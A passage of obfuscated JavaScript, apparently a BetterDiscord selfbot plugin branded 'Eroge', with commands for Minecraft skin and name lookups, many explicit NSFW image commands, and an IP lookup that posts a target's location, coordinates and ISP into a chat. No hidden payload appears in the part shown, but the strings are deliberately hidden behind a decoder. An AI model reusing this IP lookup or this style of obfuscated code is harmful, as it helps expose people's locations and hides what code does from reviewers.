          }).catch(remmy => {});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1434))) {
          jillian[abdrahman(1289)]();
          const sumayo = parseInt(maverick[0]);
          if (!maverick[0]) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(898));
          const riverleigh = (new sherae[abdrahman(344)]).setColor(COLOR)[abdrahman(1044)](abdrahman(852))[abdrahman(457)](abdrahman(362) + ("" + maverick[0]) + "`\n[Download](https://minotar.net/download/" + ("" + maverick[0]) + ")")[abdrahman(1211)](abdrahman(1270) + ("" + maverick[0]) + abdrahman(1356))[abdrahman(444)](abdrahman(711) + maverick[0] + "/100.png")[abdrahman(1264)]()[abdrahman(938)](abdrahman(899), IMAGE);
          jillian.channel.send(riverleigh);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(936))) {
          let mahati = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!mahati) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(740));
          _0x4d876d({uri: abdrahman(515) + mahati, headers: {}, json: !![], method: abdrahman(875)}, function (adrine, jeweliana, ahlanna) {
            const zorianna = abdrahman;
            var kondwani = jeweliana[zorianna(759)][zorianna(1423)], xayn = jeweliana[zorianna(759)][zorianna(1321)], dinnie = jeweliana.body.name_history, azarius = (new sherae[zorianna(344)])[zorianna(1044)]("**MC user info**")[zorianna(695)](zorianna(1274), kondwani)[zorianna(695)](zorianna(1229), xayn)[zorianna(695)](zorianna(889), JSON[zorianna(1174)](dinnie))[zorianna(321)](COLOR)[zorianna(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            azarius[zorianna(1264)](), jillian[zorianna(407)][zorianna(746)](azarius);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(716))) {
          jillian.delete();
          var serae = maverick[0];
          _0x4d876d({uri: abdrahman(566) + serae, headers: {}, json: !![], method: abdrahman(875)}, function (arjay, marais, alexuss) {
            const jeronica = abdrahman;
            var sugeily = marais[jeronica(759)][jeronica(242)], theofilos = marais[jeronica(759)].countryCode, jilla = marais[jeronica(759)][jeronica(404)], yehezkel = marais[jeronica(759)][jeronica(435)], mikhaila = marais[jeronica(759)].regionName, elmus = marais.body[jeronica(1278)], moisses = marais[jeronica(759)][jeronica(890)], normajean = marais[jeronica(759)].lat, alysen = marais.body[jeronica(378)], lytisha = marais[jeronica(759)][jeronica(1068)], keean = marais[jeronica(759)][jeronica(490)], yasamin = marais.body.as, richelle = (new sherae.RichEmbed)[jeronica(1044)](jeronica(640))[jeronica(695)](jeronica(330), "" + serae)[jeronica(695)](jeronica(450), "" + sugeily)[jeronica(695)](jeronica(1218), "" + theofilos)[jeronica(695)](jeronica(504), "" + jilla).addField(jeronica(1040), "" + yehezkel)[jeronica(695)]("region Name:", "" + mikhaila)[jeronica(695)](jeronica(599), "" + elmus)[jeronica(695)](jeronica(837), "" + moisses)[jeronica(695)](jeronica(915), "" + normajean).addField(jeronica(431), "" + alysen).addField(jeronica(1136), "" + lytisha).addField(jeronica(534), "" + keean).addField(jeronica(438), "" + yasamin)[jeronica(321)](COLOR)[jeronica(938)](jeronica(899), IMAGE);
            richelle[jeronica(1264)](), jillian[jeronica(407)][jeronica(746)](richelle);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1127))) {
          jillian[abdrahman(1289)]();
          const willene = (new sherae[abdrahman(344)]).setTitle(abdrahman(232) + maithili + "「𝙈𝙚𝙣𝙪 𝙉𝙎𝙁𝙒」" + maithili + abdrahman(613))[abdrahman(444)](shadarria.user.displayAvatarURL).setDescription(abdrahman(649) + maithili + abdrahman(506) + maithili + "```").setColor(COLOR)[abdrahman(695)]("***```" + PREFIX + abdrahman(248), "***Random Hentai image***").addField(abdrahman(712) + PREFIX + abdrahman(1188), abdrahman(595))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(604), abdrahman(824))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1300), abdrahman(975))[abdrahman(695)](abdrahman(712) + PREFIX + "pgif ```***", abdrahman(821))[abdrahman(695)]("***```" + PREFIX + abdrahman(792), abdrahman(1380))[abdrahman(695)]("***```" + PREFIX + abdrahman(1110), abdrahman(1065))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1100), "***Random Neko***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(341), "***Random hkitsune image***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1325), abdrahman(239)).addField("***```" + PREFIX + abdrahman(358), abdrahman(828))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(744), abdrahman(1139))[abdrahman(695)](abdrahman(712) + PREFIX + "gonewild ```***", abdrahman(291))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(533), abdrahman(295)).addField(abdrahman(712) + PREFIX + abdrahman(1394), abdrahman(311))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(380), abdrahman(1384))[abdrahman(695)]("***```" + PREFIX + abdrahman(1017), "***Random thigh image***")[abdrahman(695)](abdrahman(712) + PREFIX + "hthigh ```***", abdrahman(1313))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1221), abdrahman(913))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1064), abdrahman(642))[abdrahman(695)](abdrahman(712) + PREFIX + "boobs ```***", abdrahman(867))[abdrahman(695)](abdrahman(712) + PREFIX + "hboobs ```***", "***Random hboobs picture***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1375), abdrahman(1133))[abdrahman(695)]("***```" + PREFIX + abdrahman(926), "***Random futanari picture***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1186), abdrahman(1170)), andreniki = (new sherae[abdrahman(344)])[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(598), abdrahman(1189))[abdrahman(695)](abdrahman(712) + PREFIX + "cumsluts ```***", abdrahman(1212)).addField("***```" + PREFIX + abdrahman(305), abdrahman(235))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(739), abdrahman(1314))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(864), "***Random image of Feet Gif***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1331), abdrahman(459))[abdrahman(695)]("***```" + PREFIX + abdrahman(1048), abdrahman(500))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(763), abdrahman(301))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(661), abdrahman(1460)).addField(abdrahman(712) + PREFIX + "pussywank ```***", abdrahman(482))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(317), "***Random image of Tits***")[abdrahman(695)]("***```" + PREFIX + abdrahman(882), "***Random image of Traps***")[abdrahman(695)](abdrahman(712) + PREFIX + "yuri ```***", abdrahman(1436)).addField("***```" + PREFIX + abdrahman(902), abdrahman(369)).addField(abdrahman(712) + PREFIX + abdrahman(251), abdrahman(552))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(804), "***Random image of Erotic Yuri***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1120), "***Random image of Girl Solo***").addField(abdrahman(712) + PREFIX + "girlsologif ```***", abdrahman(801))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(606), abdrahman(765))[abdrahman(695)](abdrahman(712) + PREFIX + "holoero ```***", abdrahman(582)).addField(abdrahman(712) + PREFIX + abdrahman(728), abdrahman(1225))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(502), abdrahman(371))[abdrahman(1211)](IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          andreniki.setTimestamp(), jillian[abdrahman(407)].send(willene), jillian[abdrahman(407)][abdrahman(746)](andreniki), BdApi[abdrahman(1150)](abdrahman(1341), {type: "info"});
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "hentai")) {
          jillian[abdrahman(1289)](), rise();
          async function rise() {
            const essye = abdrahman;
            let demetriona = await _0x3857f[essye(1052)](essye(399)), meko = (new sherae.RichEmbed).setColor(COLOR)[essye(1044)](essye(527)).setImage(demetriona)[essye(938)](essye(899), IMAGE);
            meko.setTimestamp(), jillian[essye(407)][essye(746)](meko);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "4k")) {
          jillian[abdrahman(1289)](), lataisha();
          async function lataisha() {
            const laryssa = abdrahman;
            let jonniel = await _0x3857f[laryssa(1052)]("4k"), zaeem = (new sherae[laryssa(344)])[laryssa(321)](COLOR).setTitle("**🔞 4K Picture 🔞**").setImage(jonniel)[laryssa(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            zaeem[laryssa(1264)](), jillian[laryssa(407)][laryssa(746)](zaeem);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1046))) {
          jillian[abdrahman(1289)](), ishia();
          async function ishia() {
            const izel = abdrahman;
            let aleksia = await _0x3857f[izel(1052)]("hass"), kalashia = (new sherae[izel(344)])[izel(321)](COLOR).setTitle(izel(553))[izel(1211)](aleksia)[izel(938)](izel(899), IMAGE);
            kalashia[izel(1264)](), jillian.channel[izel(746)](kalashia);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "hmidriff")) {
          jillian[abdrahman(1289)](), zlaty();
          async function zlaty() {
            const brendolyn = abdrahman;
            let saraly = await _0x3857f[brendolyn(1052)](brendolyn(531)), blakley = (new sherae[brendolyn(344)]).setColor(COLOR).setTitle(brendolyn(1348))[brendolyn(1211)](saraly)[brendolyn(938)](brendolyn(899), IMAGE);
            blakley[brendolyn(1264)](), jillian[brendolyn(407)][brendolyn(746)](blakley);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1420))) {
          jillian[abdrahman(1289)](), glyndon();
          async function glyndon() {
            const munajj = abdrahman;
            let zachari = await _0x3857f[munajj(1052)]("pgif"), bayani = (new sherae[munajj(344)]).setColor(COLOR).setTitle(munajj(1350)).setImage(zachari).setFooter(munajj(899), IMAGE);
            bayani[munajj(1264)](), jillian[munajj(407)][munajj(746)](bayani);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "holo")) {
          jillian.delete(), abelino();
          async function abelino() {
            const mishal = abdrahman;
            let syhir = await _0x3857f.get(mishal(241)), dinh = (new sherae[mishal(344)])[mishal(321)](COLOR)[mishal(1044)]("**🔞 Holo Picture 🔞**").setImage(syhir)[mishal(938)](mishal(899), IMAGE);
            dinh[mishal(1264)](), jillian.channel[mishal(746)](dinh);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(484))) {
          jillian[abdrahman(1289)](), ericka();
          async function ericka() {
            const sreeya = abdrahman;
            let tylina = await _0x3857f.get(sreeya(484)), ita = (new sherae[sreeya(344)])[sreeya(321)](COLOR)[sreeya(1044)](sreeya(1135))[sreeya(1211)](tylina)[sreeya(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            ita[sreeya(1264)](), jillian[sreeya(407)].send(ita);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1206))) {
          jillian[abdrahman(1289)](), kadesha();
          async function kadesha() {
            const oluwabukunmi = abdrahman;
            let annamolly = await _0x3857f[oluwabukunmi(1052)](oluwabukunmi(1206)), asma = (new sherae.RichEmbed)[oluwabukunmi(321)](COLOR)[oluwabukunmi(1044)](oluwabukunmi(588))[oluwabukunmi(1211)](annamolly)[oluwabukunmi(938)](oluwabukunmi(899), IMAGE);
            asma[oluwabukunmi(1264)](), jillian[oluwabukunmi(407)][oluwabukunmi(746)](asma);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(617))) {
          jillian.delete(), dynastee();
          async function dynastee() {
            const leahmarie = abdrahman;
            let kivin = await _0x3857f[leahmarie(1052)](leahmarie(617)), delania = (new sherae[leahmarie(344)])[leahmarie(321)](COLOR)[leahmarie(1044)](leahmarie(980))[leahmarie(1211)](kivin)[leahmarie(938)](leahmarie(899), IMAGE);
            delania[leahmarie(1264)](), jillian.channel[leahmarie(746)](delania);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(446))) {
          jillian[abdrahman(1289)](), yazhini();
          async function yazhini() {
            const jkobi = abdrahman;
            let terry = await _0x3857f[jkobi(1052)](jkobi(446)), janciel = (new sherae.RichEmbed)[jkobi(321)](COLOR)[jkobi(1044)](jkobi(1468))[jkobi(1211)](terry)[jkobi(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            janciel[jkobi(1264)](), jillian.channel[jkobi(746)](janciel);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1418))) {
          jillian.delete(), diseree();
          async function diseree() {
            const patrese = abdrahman;
            let tayler = await _0x3857f[patrese(1052)](patrese(1418)), brecklynn = (new sherae[patrese(344)]).setColor(COLOR)[patrese(1044)](patrese(956)).setImage(tayler)[patrese(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            brecklynn.setTimestamp(), jillian[patrese(407)][patrese(746)](brecklynn);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1213))) {
          jillian[abdrahman(1289)](), shametrice();
          async function shametrice() {
            const om = abdrahman;
            let lavail = await _0x3857f.get(om(1213)), rayahna = (new sherae[om(344)])[om(321)](COLOR).setTitle(om(718))[om(1211)](lavail)[om(938)](om(899), IMAGE);
            rayahna[om(1264)](), jillian[om(407)][om(746)](rayahna);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(245))) {
          jillian[abdrahman(1289)](), marzavion();
          async function marzavion() {
            const kallye = abdrahman;
            let arthalia = await _0x3857f[kallye(1052)]("gonewild"), michaelpaul = (new sherae[kallye(344)]).setColor(COLOR)[kallye(1044)]("**🔞 Gonewild Picture 🔞**")[kallye(1211)](arthalia)[kallye(938)](kallye(899), IMAGE);
            michaelpaul[kallye(1264)](), jillian[kallye(407)][kallye(746)](michaelpaul);
          }
        }
        if (jillian.content.startsWith(PREFIX + abdrahman(803))) {
          jillian.delete(), methyl();
          async function methyl() {
            const sanea = abdrahman;
            let kymia = await _0x3857f[sanea(1052)](sanea(803)), eisa = (new sherae[sanea(344)])[sanea(321)](COLOR)[sanea(1044)](sanea(1190)).setImage(kymia)[sanea(938)](sanea(899), IMAGE);
            eisa[sanea(1264)](), jillian[sanea(407)].send(eisa);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(276))) {
          jillian[abdrahman(1289)](), carmella();
          async function carmella() {
            const massai = abdrahman;
            let airys = await _0x3857f.get(massai(276)), savoy = (new sherae[massai(344)])[massai(321)](COLOR)[massai(1044)](massai(1454)).setImage(airys).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            savoy[massai(1264)](), jillian[massai(407)][massai(746)](savoy);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1094))) {
          jillian.delete(), threasa();
          async function threasa() {
            const daizja = abdrahman;
            let murvel = await _0x3857f[daizja(1052)](daizja(1094)), quaylen = (new sherae.RichEmbed).setColor(COLOR)[daizja(1044)](daizja(1238))[daizja(1211)](murvel).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            quaylen[daizja(1264)](), jillian[daizja(407)][daizja(746)](quaylen);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(332))) {
          jillian.delete(), kurdt();
          async function kurdt() {
            const norelia = abdrahman;
            let maisy = await _0x3857f[norelia(1052)]("thigh"), launi = (new sherae[norelia(344)]).setColor(COLOR)[norelia(1044)]("**🔞 Thigh Picture 🔞**")[norelia(1211)](maisy).setFooter(norelia(899), IMAGE);
            launi.setTimestamp(), jillian[norelia(407)][norelia(746)](launi);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "hthigh")) {
          jillian.delete(), valentia();
          async function valentia() {
            const aritza = abdrahman;
            let trevontae = await _0x3857f[aritza(1052)]("hthigh"), tansey = (new sherae.RichEmbed)[aritza(321)](COLOR)[aritza(1044)](aritza(415))[aritza(1211)](trevontae)[aritza(938)](aritza(899), IMAGE);
            tansey.setTimestamp(), jillian.channel[aritza(746)](tansey);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(528))) {
          jillian.delete(), shaikeem();
          async function shaikeem() {
            const bashan = abdrahman;
            let levar = await _0x3857f[bashan(1052)](bashan(528)), bryceon = (new sherae.RichEmbed)[bashan(321)](COLOR).setTitle("**🔞 Paizuri Picture 🔞**")[bashan(1211)](levar)[bashan(938)](bashan(899), IMAGE);
            bryceon[bashan(1264)](), jillian[bashan(407)][bashan(746)](bryceon);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1016))) {
          jillian[abdrahman(1289)](), brasi();
          async function brasi() {
            const langdon = abdrahman;
            let embla = await _0x3857f[langdon(1052)]("tentacle"), romell = (new sherae[langdon(344)]).setColor(COLOR).setTitle("**🔞 Tentacle Picture 🔞**")[langdon(1211)](embla)[langdon(938)](langdon(899), IMAGE);
            romell[langdon(1264)](), jillian.channel[langdon(746)](romell);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(931))) {
          jillian[abdrahman(1289)](), egor();
          async function egor() {
            const zeno = abdrahman;
            let kantrice = await _0x3857f.get(zeno(931)), kolesyn = (new sherae[zeno(344)])[zeno(321)](COLOR)[zeno(1044)](zeno(1262)).setImage(kantrice)[zeno(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            kolesyn[zeno(1264)](), jillian[zeno(407)][zeno(746)](kolesyn);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(397))) {
          jillian[abdrahman(1289)](), chikaima();
          async function chikaima() {
            const siloe = abdrahman;
            let mesiah = await _0x3857f[siloe(1052)](siloe(397)), avondre = (new sherae[siloe(344)]).setColor(COLOR)[siloe(1044)](siloe(536))[siloe(1211)](mesiah).setFooter(siloe(899), IMAGE);
            avondre[siloe(1264)](), jillian[siloe(407)].send(avondre);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(549))) {
          jillian[abdrahman(1289)](), donte();
          async function donte() {
            const zoel = abdrahman;
            let bryand = await _0x3857f.get("yaoi"), chrisiyah = (new sherae[zoel(344)])[zoel(321)](COLOR)[zoel(1044)]("**🔞 Yaoi Picture 🔞**").setImage(bryand)[zoel(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            chrisiyah[zoel(1264)](), jillian.channel[zoel(746)](chrisiyah);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(611))) {
          jillian.delete(), rodricka();
          async function rodricka() {
            const luticia = abdrahman;
            _0x4d876d(luticia(937), function (dezhane, kenrie, christinejoy) {
              const evangaline = luticia;
              if (!dezhane && kenrie[evangaline(977)] == 200) {
                var krystalle = _0x51d1d3[evangaline(1092)](christinejoy), raya = krystalle.text(), lynleigh = raya[evangaline(738)]('{"url":"', ""), brandylee = lynleigh.replace('"}', "");
                let adlea = (new sherae[evangaline(344)]).setColor(COLOR)[evangaline(1044)](evangaline(286)).setImage(brandylee)[evangaline(938)](evangaline(899), IMAGE);
                adlea[evangaline(1264)](), jillian.channel[evangaline(746)](adlea);
              }
            });
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(361))) {
          var jenyfer = jillian[abdrahman(393)][abdrahman(1028)](/\s+/g)[abdrahman(1063)](1).join(" ");
          _0x34a6c3.search(abdrahman(312), [jenyfer], {nsfw: !![], limit: 1, random: !![]}).then(_0x34a6c3.commonfy)[abdrahman(656)](kiaura => {
            const amannda = abdrahman;
            for (let raymer of kiaura) {
              const darrah = (new sherae.RichEmbed)[amannda(321)](COLOR)[amannda(1044)](amannda(769))[amannda(1211)](raymer[amannda(1430)][amannda(1007)])[amannda(1204)](raymer.common[amannda(1007)])[amannda(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
              return jillian[amannda(407)][amannda(746)]({embed: darrah});
            }
          })[abdrahman(652)](hina => {
            const maleko = abdrahman;
            return hina.name === maleko(441) ? jillian[maleko(407)][maleko(746)](maleko(1371) + jenyfer + "**!") : jillian.channel.send("No results found for **" + jenyfer + "**!");
          });
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(731))) {
          jillian[abdrahman(1289)](), laneise();
          async function laneise() {
            const krystalann = abdrahman;
            let diminic = await _0x1ea298[krystalann(1127)][krystalann(709)](), detri = (new sherae.RichEmbed)[krystalann(321)](COLOR).setTitle(krystalann(583))[krystalann(1211)](diminic[krystalann(1378)])[krystalann(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            detri[krystalann(1264)](), jillian[krystalann(407)][krystalann(746)](detri);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "cumsluts")) {
          jillian[abdrahman(1289)](), sylvania();
          async function sylvania() {
            const nayome = abdrahman;
            let christieann = await _0x1ea298.nsfw.cumsluts(), dinnah = (new sherae[nayome(344)])[nayome(321)](COLOR)[nayome(1044)](nayome(1099))[nayome(1211)](christieann[nayome(1378)])[nayome(938)](nayome(899), IMAGE);
            dinnah[nayome(1264)](), jillian[nayome(407)][nayome(746)](dinnah);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1374))) {
          jillian[abdrahman(1289)](), severio();
          async function severio() {
            const azareya = abdrahman;
            let shunya = await _0x1ea298[azareya(1127)].cumArts(), nadim = (new sherae.RichEmbed).setColor(COLOR).setTitle("**🔞 Cum arts Picture 🔞**")[azareya(1211)](shunya[azareya(1378)])[azareya(938)](azareya(899), IMAGE);
            nadim[azareya(1264)](), jillian[azareya(407)][azareya(746)](nadim);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "feet")) {
          jillian[abdrahman(1289)](), jamesdean();
          async function jamesdean() {
            const dom = abdrahman;
            let kikue = await _0x1ea298[dom(1127)][dom(1349)](), nehal = (new sherae[dom(344)])[dom(321)](COLOR)[dom(1044)](dom(487))[dom(1211)](kikue.url)[dom(938)](dom(899), IMAGE);
            nehal[dom(1264)](), jillian[dom(407)][dom(746)](nehal);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "feetgif")) {
          jillian.delete(), monterrio();
          async function monterrio() {
            const jannali = abdrahman;
            let kaidee = await _0x1ea298[jannali(1127)][jannali(409)](), yzabella = (new sherae[jannali(344)])[jannali(321)](COLOR)[jannali(1044)]("**🔞 Feet gif Picture 🔞**")[jannali(1211)](kaidee.url)[jannali(938)](jannali(899), IMAGE);
            yzabella[jannali(1264)](), jillian[jannali(407)][jannali(746)](yzabella);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1442))) {
          jillian.delete(), syaira();
          async function syaira() {
            const verenize = abdrahman;
            let roxeanne = await _0x1ea298[verenize(1127)].femdom(), rally = (new sherae[verenize(344)])[verenize(321)](COLOR).setTitle(verenize(1168)).setImage(roxeanne[verenize(1378)])[verenize(938)](verenize(899), IMAGE);
            rally[verenize(1264)](), jillian[verenize(407)][verenize(746)](rally);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(390))) {
          jillian[abdrahman(1289)](), tiayana();
          async function tiayana() {
            const wiktor = abdrahman;
            let malaine = await _0x1ea298.nsfw.gasm(), romanus = (new sherae.RichEmbed)[wiktor(321)](COLOR).setTitle(wiktor(1261))[wiktor(1211)](malaine.url)[wiktor(938)](wiktor(899), IMAGE);
            romanus[wiktor(1264)](), jillian[wiktor(407)].send(romanus);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1043))) {
          jillian[abdrahman(1289)](), sophiah();
          async function sophiah() {
            const arilene = abdrahman;
            let desma = await _0x1ea298[arilene(1127)][arilene(1043)](), makeen = (new sherae[arilene(344)])[arilene(321)](COLOR).setTitle(arilene(1129))[arilene(1211)](desma[arilene(1378)]).setFooter(arilene(899), IMAGE);
            makeen[arilene(1264)](), jillian[arilene(407)][arilene(746)](makeen);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1161))) {
          jillian[abdrahman(1289)](), isalena();
          async function isalena() {
            const keolani = abdrahman;
            let othell = await _0x1ea298[keolani(1127)].lesbian(), nachum = (new sherae[keolani(344)])[keolani(321)](COLOR)[keolani(1044)](keolani(377))[keolani(1211)](othell[keolani(1378)])[keolani(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            nachum[keolani(1264)](), jillian[keolani(407)][keolani(746)](nachum);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(996))) {
          jillian[abdrahman(1289)](), jermanii();
          async function jermanii() {
            const isiash = abdrahman;
            let jeanney = await _0x1ea298[isiash(1127)].pussyWankGif(), salice = (new sherae[isiash(344)]).setColor(COLOR)[isiash(1044)]("**🔞 PussyWankGif Picture 🔞**")[isiash(1211)](jeanney[isiash(1378)])[isiash(938)](isiash(899), IMAGE);
            salice[isiash(1264)](), jillian[isiash(407)][isiash(746)](salice);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1287))) {
          jillian.delete(), temima();
          async function temima() {
            const miliana = abdrahman;
            let keegen = await _0x1ea298.nsfw[miliana(1287)](), kerrianne = (new sherae[miliana(344)])[miliana(321)](COLOR)[miliana(1044)]("**🔞 Tits Picture 🔞**")[miliana(1211)](keegen.url)[miliana(938)](miliana(899), IMAGE);
            kerrianne[miliana(1264)](), jillian[miliana(407)][miliana(746)](kerrianne);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1322))) {
          jillian[abdrahman(1289)](), dwade();
          async function dwade() {
            const monette = abdrahman;
            let mcihelle = await _0x1ea298[monette(1127)].trap(), fira = (new sherae[monette(344)])[monette(321)](COLOR)[monette(1044)](monette(761))[monette(1211)](mcihelle.url).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            fira[monette(1264)](), jillian.channel[monette(746)](fira);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "yuri")) {
          jillian[abdrahman(1289)](), charlyse();
          async function charlyse() {
            const gopi = abdrahman;
            let lamontae = await _0x1ea298[gopi(1127)][gopi(1326)](), russelle = (new sherae[gopi(344)])[gopi(321)](COLOR)[gopi(1044)](gopi(745))[gopi(1211)](lamontae[gopi(1378)]).setFooter(gopi(899), IMAGE);
            russelle[gopi(1264)](), jillian[gopi(407)][gopi(746)](russelle);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(842))) {
          const goretti = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!goretti) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(1366));
          zoia();
          async function zoia() {
            const harlen = abdrahman;
            let maribell = await _0x1ea298[harlen(1127)][harlen(1004)]();
            const yanali = (new sherae.RichEmbed)[harlen(1044)](harlen(1307) + jillian[harlen(887)][harlen(1423)] + harlen(943) + goretti.username + harlen(1074))[harlen(1211)](maribell[harlen(1378)])[harlen(321)](COLOR)[harlen(938)](harlen(899), IMAGE).setTimestamp();
            jillian[harlen(407)][harlen(746)](yanali);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(855))) {
          jillian.delete(), naylin();
          async function naylin() {
            const cennie = abdrahman;
            let bean = await _0x1ea298[cennie(1127)].ero(), odette = (new sherae[cennie(344)])[cennie(321)](COLOR)[cennie(1044)](cennie(1224))[cennie(1211)](bean.url)[cennie(938)](cennie(899), IMAGE);
            odette.setTimestamp(), jillian[cennie(407)][cennie(746)](odette);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "eroyuri")) {
          jillian[abdrahman(1289)](), veroncia();
          async function veroncia() {
            const leory = abdrahman;
            let charlayne = await _0x1ea298.nsfw[leory(1054)](), shazad = (new sherae[leory(344)])[leory(321)](COLOR)[leory(1044)]("**🔞 Erotic yuri Picture 🔞**")[leory(1211)](charlayne[leory(1378)])[leory(938)](leory(899), IMAGE);
            shazad[leory(1264)](), jillian[leory(407)].send(shazad);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1332))) {
          jillian[abdrahman(1289)](), trigg();
          async function trigg() {
            const dynisha = abdrahman;
            let kristinamarie = await _0x1ea298[dynisha(1127)][dynisha(1279)](), charae = (new sherae.RichEmbed)[dynisha(321)](COLOR).setTitle(dynisha(1290))[dynisha(1211)](kristinamarie.url).setFooter(dynisha(899), IMAGE);
            charae[dynisha(1264)](), jillian[dynisha(407)][dynisha(746)](charae);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1143))) {
          jillian[abdrahman(1289)](), mehdi();
          async function mehdi() {
            const eadyn = abdrahman;
